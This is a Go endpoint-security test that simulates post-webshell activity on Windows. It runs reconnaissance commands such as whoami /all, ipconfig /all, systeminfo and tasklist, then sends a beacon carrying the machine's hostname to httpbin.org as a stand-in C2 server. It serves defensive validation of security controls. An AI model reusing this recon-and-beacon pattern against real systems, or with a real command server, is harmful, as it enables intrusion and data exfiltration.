//go:build windows
// +build windows

/*
ID: c5f1d6e9-4a0b-1f8c-5d2e-9b0c1d2e3f09
NAME: Webshell Post-Exploitation Simulation
TECHNIQUES: T1190, T1059.003
TACTICS: initial-access, execution
SEVERITY: high
TARGET: windows-endpoint
COMPLEXITY: medium
THREAT_ACTOR: N/A
SUBCATEGORY: initial-access
TAGS: webshell, cmd-execution, exploit-public-facing, post-exploitation
SOURCE_URL: https://top-attack-techniques.mitre-engenuity.org/
UNIT: response
CREATED: 2026-01-11
AUTHOR: sectest-builder
*/
package main

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/google/uuid"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

const (
	TEST_UUID  = "c5f1d6e9-4a0b-1f8c-5d2e-9b0c1d2e3f09"
	TEST_NAME  = "Webshell Post-Exploitation Simulation"
	TARGET_DIR = "c:\\F0"

	// ExitTestError is the framework test-error exit code. The vendored prelude
	// endpoint lib maps UnexpectedTestError to exit 1 — do not use it (CLAUDE.md).
	ExitTestError = 999
)

// isAdminContext gates denial classification (Bug Prevention Rule 8).
var isAdminContext = false

// probeAdminContext checks whether the current context is elevated.
func probeAdminContext() bool {
	return exec.Command("net", "session").Run() == nil
}

// isPositiveProtectionEvidence returns true ONLY for exact OS/policy denial
// markers (generic words, PATH errors and localized variants are NOT evidence).
func isPositiveProtectionEvidence(s string) bool {
	return strings.Contains(s, "Access is denied") ||
		strings.Contains(s, "This program is blocked by group policy") ||
		strings.Contains(s, "Operation did not complete successfully because the file contains a virus")
}

// C2 test endpoint - harmless public service for connectivity verification
const C2_ENDPOINT = "https://httpbin.org/post"

// ReconCommand represents a reconnaissance command typical of webshell activity
type ReconCommand struct {
	Name        string
	Command     string
	Args        []string
	Description string
}

// Define reconnaissance commands typically executed via webshells
var reconCommands = []ReconCommand{
	{
		Name:        "whoami",
		Command:     "whoami",
		Args:        []string{"/all"},
		Description: "User context enumeration - identifies privileges and group memberships",
	},
	{
		Name:        "hostname",
		Command:     "hostname",
		Args:        []string{},
		Description: "System identification - reveals machine name for lateral movement planning",
	},
	{
		Name:        "ipconfig",
		Command:     "ipconfig",
		Args:        []string{"/all"},
		Description: "Network configuration - identifies IP addresses, DNS, DHCP for network mapping",
	},
	{
		Name:        "systeminfo",
		Command:     "systeminfo",
		Args:        []string{},
		Description: "Full system information - OS version, hotfixes, domain membership",
	},
	{
		Name:        "netstat",
		Command:     "netstat",
		Args:        []string{"-an"},
		Description: "Network connections - active connections and listening ports",
	},
	{
		Name:        "tasklist",
		Command:     "tasklist",
		Args:        []string{},
		Description: "Running processes - identify security software and interesting processes",
	},
}

// CommandResult stores the result of a reconnaissance command
type CommandResult struct {
	Command  string
	Success  bool
	Blocked  bool
	Output   string
	Error    string
	Duration time.Duration
	ExitCode int
}

// executeReconCommand executes a single reconnaissance command and captures result
func executeReconCommand(rc ReconCommand) CommandResult {
	result := CommandResult{
		Command: rc.Name,
	}

	startTime := time.Now()

	var cmd *exec.Cmd
	if len(rc.Args) > 0 {
		cmd = exec.Command(rc.Command, rc.Args...)
	} else {
		cmd = exec.Command(rc.Command)
	}

	// Tee output to console AND buffer; persist per-command output file
	var outputBuffer bytes.Buffer
	cmd.Stdout = io.MultiWriter(os.Stdout, &outputBuffer)
	cmd.Stderr = io.MultiWriter(os.Stderr, &outputBuffer)

	err := cmd.Run()
	result.Duration = time.Since(startTime)
	result.Output = outputBuffer.String()

	pid := 0
	exitCode := 0
	if cmd.Process != nil {
		pid = cmd.Process.Pid
	}

	if len(result.Output) > 0 {
		outputPath := filepath.Join(TARGET_DIR, fmt.Sprintf("%s_output.txt", rc.Name))
		os.WriteFile(outputPath, []byte(result.Output), 0644)
	}

	cmdLine := strings.Join(append([]string{rc.Command}, rc.Args...), " ")

	if err != nil {
		result.Error = err.Error()
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			exitCode = 1
		}

		// Block ONLY on exact OS denial, admin-gated (Rule 8). "not recognized"
		// is a PATH/missing-binary environment error — benign.
		if isAdminContext && (isPositiveProtectionEvidence(result.Output) || isPositiveProtectionEvidence(result.Error)) {
			result.Blocked = true
			result.ExitCode = 126
			LogProcessExecution(rc.Command, cmdLine, pid, false, 126, "Blocked by security controls (OS denial)")
		} else {
			result.ExitCode = exitCode
			LogProcessExecution(rc.Command, cmdLine, pid, false, exitCode, err.Error())
		}
		return result
	}

	// Command succeeded
	result.Success = true
	result.ExitCode = 0
	LogProcessExecution(rc.Command, cmdLine, pid, true, 0, "")

	return result
}

// performC2Callback simulates a C2 callback that a webshell might perform
// Uses httpbin.org as a safe test endpoint
func performC2Callback(data string) (bool, bool, string) {
	Endpoint.Say("  Simulating C2 callback to %s", C2_ENDPOINT)

	// Create POST request with simulated beacon data
	payload := strings.NewReader(fmt.Sprintf("beacon=%s&host=%s", data, os.Getenv("COMPUTERNAME")))

	client := &http.Client{
		Timeout: 30 * time.Second,
	}

	req, err := http.NewRequest("POST", C2_ENDPOINT, payload)
	if err != nil {
		return false, false, fmt.Sprintf("Failed to create request: %v", err)
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	startTime := time.Now()
	resp, err := client.Do(req)
	duration := time.Since(startTime)

	if err != nil {
		// Network errors (DNS failure, refused connections, timeouts) are
		// environmental conditions, NOT endpoint protection evidence (Rule 8).
		errorStr := err.Error()
		LogMessage("WARN", "C2 Callback", fmt.Sprintf("C2 callback network failure (benign, not protection evidence): %s (%v)", errorStr, duration))
		return false, false, fmt.Sprintf("Network error: %v", err)
	}
	defer resp.Body.Close()

	// Read response
	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		LogMessage("INFO", "C2 Callback", fmt.Sprintf("C2 callback successful: HTTP %d (%v)", resp.StatusCode, duration))
		return true, false, fmt.Sprintf("HTTP %d - %d bytes received", resp.StatusCode, len(body))
	}

	// Non-success status codes are the REMOTE service's response (httpbin),
	// not endpoint protection — never classified as blocked (Rule 8).
	if resp.StatusCode == 403 || resp.StatusCode == 451 {
		LogMessage("WARN", "C2 Callback", fmt.Sprintf("Remote endpoint returned HTTP %d (remote-service response, not endpoint protection)", resp.StatusCode))
	}
	return false, false, fmt.Sprintf("HTTP %d", resp.StatusCode)
}

// writeReconOutput saves all reconnaissance output to a marker file
func writeReconOutput(results []CommandResult) error {
	outputPath := filepath.Join(TARGET_DIR, "webshell_recon_output.txt")

	var content strings.Builder
	content.WriteString("=== Webshell Post-Exploitation Reconnaissance Output ===\n")
	content.WriteString(fmt.Sprintf("Timestamp: %s\n", time.Now().Format("2006-01-02 15:04:05")))
	content.WriteString(fmt.Sprintf("Test UUID: %s\n", TEST_UUID))
	content.WriteString("\n")

	for _, result := range results {
		content.WriteString(fmt.Sprintf("--- %s ---\n", result.Command))
		content.WriteString(fmt.Sprintf("Success: %v | Blocked: %v | Duration: %v\n", result.Success, result.Blocked, result.Duration))
		if result.Error != "" {
			content.WriteString(fmt.Sprintf("Error: %s\n", result.Error))
		}
		if result.Output != "" {
			content.WriteString("Output:\n")
			// Truncate very long output
			output := result.Output
			if len(output) > 2000 {
				output = output[:2000] + "\n... (truncated)"
			}
			content.WriteString(output)
		}
		content.WriteString("\n\n")
	}

	outputBytes := []byte(content.String())
	err := os.WriteFile(outputPath, outputBytes, 0644)
	if err != nil {
		return err
	}

	LogFileDropped("webshell_recon_output.txt", outputPath, int64(len(outputBytes)), false)
	return nil
}

// cleanup removes test artifacts
func cleanup() {
	Endpoint.Say("Cleaning up test artifacts...")

	files := []string{
		"webshell_recon_output.txt",
		"test_summary.txt",
		"whoami_output.txt",
		"hostname_output.txt",
		"ipconfig_output.txt",
		"systeminfo_output.txt",
		"netstat_output.txt",
		"tasklist_output.txt",
	}

	for _, file := range files {
		path := filepath.Join(TARGET_DIR, file)
		if err := os.Remove(path); err == nil {
			LogMessage("INFO", "Cleanup", fmt.Sprintf("Removed: %s", file))
		}
	}
}

func test() {
	// Ensure log is saved on exit
	defer func() {
		if r := recover(); r != nil {
			if globalLog != nil {
				LogMessage("CRITICAL", "Runtime", fmt.Sprintf("Panic recovered: %v", r))
				SaveLog(ExitTestError, fmt.Sprintf("Panic: %v", r))
			}
			cleanup()
			Endpoint.Stop(ExitTestError)
		}
	}()

	// Track results
	var commandResults []CommandResult
	blockedCount := 0
	successCount := 0
	c2Success := false
	c2Blocked := false

	// Phase 1: Initialization
	LogPhaseStart(1, "Initialization")
	Endpoint.Say("Phase 1: Initializing test environment")

	// NOTE: Endpoint.Dropper call removed — it dropped an unused binary into CWD
	// on every run and was never executed (audit 2026-11-03).

	// Create target directory
	if err := os.MkdirAll(TARGET_DIR, 0755); err != nil {
		LogPhaseError(0, fmt.Sprintf("Failed to create target directory: %v", err))
		LogPhaseEnd(0, "failed", "Failed to create target directory")
		SaveLog(ExitTestError, "Failed to create target directory")
		Endpoint.Stop(ExitTestError)
	}

	// Probe privilege context once — gates denial classification (Rule 8)
	isAdminContext = probeAdminContext()
	if isAdminContext {
		LogMessage("INFO", "Initialization", "Running elevated (administrator)")
	} else {
		LogMessage("WARN", "Initialization", "Running NON-elevated — access-denied outcomes will be treated as benign environment results")
	}

	LogMessage("INFO", "Initialization", "Test environment ready")
	LogPhaseEnd(0, "success", "Environment initialized")

	// Phase 2: Execute Reconnaissance Commands
	LogPhaseStart(2, "Reconnaissance Commands")
	Endpoint.Say("\nPhase 2: Executing webshell reconnaissance commands")
	Endpoint.Say("This simulates commands a webshell would run after initial compromise")
	Endpoint.Say("")

	for i, rc := range reconCommands {
		Endpoint.Say("  [%d/%d] Running: %s %s", i+1, len(reconCommands), rc.Command, strings.Join(rc.Args, " "))
		Endpoint.Say("        Purpose: %s", rc.Description)

		result := executeReconCommand(rc)
		commandResults = append(commandResults, result)

		if result.Blocked {
			Endpoint.Say("        [BLOCKED] Command execution was prevented")
			blockedCount++
		} else if result.Success {
			Endpoint.Say("        [EXECUTED] Command completed successfully")
			successCount++
		} else {
			Endpoint.Say("        [FAILED] Command failed: %s", result.Error)
		}

		// Small delay between commands to simulate realistic webshell behavior
		Endpoint.Wait(1)
	}

	if blockedCount > 0 {
		LogPhaseEnd(1, "blocked", fmt.Sprintf("%d/%d commands blocked by security controls", blockedCount, len(reconCommands)))
	} else if successCount == len(reconCommands) {
		LogPhaseEnd(1, "success", fmt.Sprintf("All %d reconnaissance commands executed", len(reconCommands)))
	} else {
		LogPhaseEnd(1, "partial", fmt.Sprintf("%d/%d commands succeeded", successCount, len(reconCommands)))
	}

	// Phase 3: C2 Callback Simulation
	LogPhaseStart(3, "C2 Callback Simulation")
	Endpoint.Say("\nPhase 3: Simulating C2 callback (webshell beacon)")
	Endpoint.Say("  Target: %s (harmless test endpoint)", C2_ENDPOINT)

	// Build beacon data from recon results
	hostname := os.Getenv("COMPUTERNAME")
	if hostname == "" {
		hostname = "unknown"
	}
	beaconData := fmt.Sprintf("F0RT1KA-Webshell-Test|%s|%s", TEST_UUID, hostname)

	var c2Error string
	c2Success, c2Blocked, c2Error = performC2Callback(beaconData)

	if c2Blocked {
		Endpoint.Say("  [BLOCKED] C2 callback was blocked by network security")
		LogPhaseEnd(2, "blocked", "C2 callback blocked by network security")
	} else if c2Success {
		Endpoint.Say("  [VULNERABLE] C2 callback completed successfully")
		LogPhaseEnd(2, "success", "C2 callback succeeded - outbound connection allowed")
	} else {
		// Network unavailable - not necessarily protected, could be environmental
		Endpoint.Say("  [ERROR] C2 callback failed: %s", c2Error)
		LogPhaseEnd(2, "failed", fmt.Sprintf("C2 callback failed: %s", c2Error))
	}

	// Phase 4: Write Output and Assessment
	LogPhaseStart(4, "Output and Assessment")
	Endpoint.Say("\nPhase 4: Writing output and final assessment")

	// Save reconnaissance output
	if err := writeReconOutput(commandResults); err != nil {
		LogMessage("WARN", "Output", fmt.Sprintf("Failed to write recon output: %v", err))
	} else {
		Endpoint.Say("  Reconnaissance output saved to: %s\\webshell_recon_output.txt", TARGET_DIR)
	}

	// Write summary
	summaryPath := filepath.Join(TARGET_DIR, "test_summary.txt")
	summary := fmt.Sprintf(`Webshell Post-Exploitation Simulation Summary
=============================================
Test ID: %s
Timestamp: %s

MITRE ATT&CK Techniques:
- T1190: Exploit Public-Facing Application (post-exploitation)
- T1059.003: Windows Command Shell

Reconnaissance Commands:
  Total: %d
  Executed Successfully: %d
  Blocked: %d

C2 Callback:
  Endpoint: %s
  Success: %v
  Blocked: %v

Assessment:
%s
`,
		TEST_UUID,
		time.Now().Format("2006-01-02 15:04:05"),
		len(reconCommands),
		successCount,
		blockedCount,
		C2_ENDPOINT,
		c2Success,
		c2Blocked,
		generateAssessment(blockedCount, successCount, c2Success, c2Blocked))

	os.WriteFile(summaryPath, []byte(summary), 0644)
	LogFileDropped("test_summary.txt", summaryPath, int64(len(summary)), false)

	LogPhaseEnd(3, "success", "Assessment complete")

	// Final Results
	Endpoint.Say("\n========================================")
	Endpoint.Say("TEST RESULTS SUMMARY")
	Endpoint.Say("========================================")
	Endpoint.Say("Reconnaissance Commands:")
	Endpoint.Say("  - Executed: %d/%d", successCount, len(reconCommands))
	Endpoint.Say("  - Blocked: %d/%d", blockedCount, len(reconCommands))
	Endpoint.Say("C2 Callback:")
	Endpoint.Say("  - Success: %v", c2Success)
	Endpoint.Say("  - Blocked: %v", c2Blocked)

	// Determine exit code based on protection status
	// Protected if: any recon commands blocked OR C2 callback blocked
	if blockedCount > 0 || c2Blocked {
		protectionDetails := []string{}
		if blockedCount > 0 {
			protectionDetails = append(protectionDetails, fmt.Sprintf("%d recon commands blocked", blockedCount))
		}
		if c2Blocked {
			protectionDetails = append(protectionDetails, "C2 callback blocked")
		}

		Endpoint.Say("\n[RESULT] PROTECTED - Security controls detected webshell activity")
		LogMessage("INFO", "Final Assessment", fmt.Sprintf("System PROTECTED: %s", strings.Join(protectionDetails, ", ")))
		SaveLog(Endpoint.ExecutionPrevented, fmt.Sprintf("Protected: %s", strings.Join(protectionDetails, ", ")))
		cleanup()
		Endpoint.Stop(Endpoint.ExecutionPrevented) // Exit 126
	} else if !c2Success && successCount < len(reconCommands) {
		// C2 failed but not blocked, some commands failed - network issue
		Endpoint.Say("\n[RESULT] INCONCLUSIVE - Network issues prevented full test")
		LogMessage("WARN", "Final Assessment", "Test inconclusive due to network/environmental issues")
		SaveLog(ExitTestError, "Network unavailable for C2 callback")
		cleanup()
		Endpoint.Stop(ExitTestError) // Exit 999 - network unavailable
	} else if successCount > 0 || c2Success {
		// Some or all commands succeeded and C2 worked - unprotected
		Endpoint.Say("\n[RESULT] UNPROTECTED - Webshell reconnaissance and C2 activity succeeded")
		LogMessage("CRITICAL", "Final Assessment", "System UNPROTECTED - webshell activity not detected")
		SaveLog(Endpoint.Unprotected, fmt.Sprintf("Unprotected: %d commands executed, C2 callback %v", successCount, c2Success))
		cleanup()
		Endpoint.Stop(Endpoint.Unprotected) // Exit 101
	} else {
		// Edge case
		Endpoint.Say("\n[RESULT] INCONCLUSIVE - Unable to determine protection status")
		LogMessage("WARN", "Final Assessment", "Test inconclusive")
		SaveLog(ExitTestError, "Test inconclusive")
		cleanup()
		Endpoint.Stop(ExitTestError)
	}
}

// generateAssessment creates an assessment string based on results
func generateAssessment(blocked, successful int, c2Success, c2Blocked bool) string {
	if blocked > 0 && c2Blocked {
		return "PROTECTED - Both reconnaissance commands and C2 callbacks were blocked.\n" +
			"Security controls effectively detected webshell-like activity."
	} else if blocked > 0 || c2Blocked {
		return "PARTIAL PROTECTION - Some webshell activity was blocked.\n" +
			"Review security configuration for comprehensive coverage."
	} else if successful > 0 && c2Success {
		return "UNPROTECTED - All reconnaissance commands executed and C2 callback succeeded.\n" +
			"Webshell activity would not be detected by current security controls."
	} else if successful > 0 {
		return "PARTIALLY UNPROTECTED - Reconnaissance commands executed.\n" +
			"C2 callback may have been blocked by network controls."
	}
	return "INCONCLUSIVE - Unable to determine protection status."
}

func main() {
	Endpoint.Say("Starting test at: %s", time.Now().Format("2006-01-02T15:04:05"))
	Endpoint.Say("Test: %s", TEST_NAME)
	Endpoint.Say("UUID: %s", TEST_UUID)
	Endpoint.Say("MITRE ATT&CK: T1190 (Exploit Public-Facing Application), T1059.003 (Windows Command Shell)")
	Endpoint.Say("")
	Endpoint.Say("This test simulates POST-EXPLOITATION behavior after webshell deployment.")
	Endpoint.Say("It runs reconnaissance commands and attempts a C2 callback.")
	Endpoint.Say("")

	// Initialize Schema v2.0 compliant logger
	metadata := TestMetadata{
		Version:       "1.0.0",
		Category:      "initial_access",
		Severity:      "high",
		Techniques:    []string{"T1190", "T1059.003"},
		Tactics:       []string{"initial-access", "execution"},
		Score:         6.9, // v2.1 — lab-verified 2026-11-03 on the win lab (Sophos Intercept X). See info.md v2.1 scorecard.
		RubricVersion: "v2.1",
		// ScoreBreakdown intentionally nil under v2.1 — the v1 dimensions in
		// the struct do not match the v2.1 tiered structure. The v2.1 breakdown
		// lives in the info.md scorecard table.
		Tags: []string{"webshell", "post-exploitation", "reconnaissance", "c2", "native"},
	}

	// Resolve organization from registry
	orgInfo := ResolveOrganization("")

	executionContext := ExecutionContext{
		ExecutionID:    uuid.New().String(),
		Organization:   orgInfo.UUID,
		Environment:    "lab",
		DeploymentType: "manual",
		Configuration: &ExecutionConfiguration{
			TimeoutMs:         180000, // 3 minutes for network operations
			CertificateMode:   "not-required",
			MultiStageEnabled: false,
		},
	}

	InitLogger(TEST_UUID, TEST_NAME, metadata, executionContext)

	// Run test with timeout
	done := make(chan bool, 1)
	go func() {
		test()
		done <- true
	}()

	timeout := 3 * time.Minute // Extended for network operations

	select {
	case <-done:
		Endpoint.Say("Test completed")
	case <-time.After(timeout):
		Endpoint.Say("Test timed out after %v", timeout)
		if globalLog != nil {
			LogMessage("ERROR", "Timeout", fmt.Sprintf("Test exceeded timeout of %v", timeout))
			SaveLog(Endpoint.TimeoutExceeded, fmt.Sprintf("Test exceeded timeout of %v", timeout))
		}
		cleanup()
		Endpoint.Stop(Endpoint.TimeoutExceeded)
	}
}
